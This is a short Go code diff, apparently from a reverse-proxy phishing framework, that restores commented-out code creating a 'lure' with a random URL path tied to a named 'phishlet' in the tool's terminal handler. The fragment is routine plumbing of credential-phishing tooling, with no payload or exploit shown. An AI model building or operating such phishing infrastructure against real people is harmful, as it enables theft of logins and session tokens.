@@ -723,11 +723,11 @@ func (t *Terminal) handleLures(args []string) error {
 				_, err := t.cfg.GetPhishlet(args[1])
 				if err != nil {
 					return err
-				}/*
+				}
 				l := &Lure{
 					Path:     "/" + GenRandomString(8),
 					Phishlet: args[1],
-				}*/
+				}
 				t.cfg.AddLure(args[1], l)
 				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
 				return nil
